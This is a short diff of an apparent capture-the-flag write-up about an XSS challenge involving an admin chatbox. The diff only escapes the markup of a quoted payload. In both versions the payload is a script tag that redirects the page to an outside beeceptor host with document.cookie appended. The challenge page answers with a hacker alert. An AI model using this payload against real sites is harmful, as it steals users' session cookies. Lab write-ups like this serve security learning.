@@ -1,8 +1,8 @@
 This challenge is clearly another xss challenge as its in the webpage link we get.<br />
 We see a page with a moving image and a chatbox with an admin.
 
-I tried the same xss as in the Government Agriculture Network challenge:
-<script>location.href="https://paulovh.free.beeceptor.com?"+ document.cookie</script>
+I tried the same xss as in the Government Agriculture Network challenge:<br />
+\<script\>location.href="https://paulovh.free.beeceptor.com?"+ document.cookie\</script\>
 
 This returns:<br />
 HACKER ALERT!
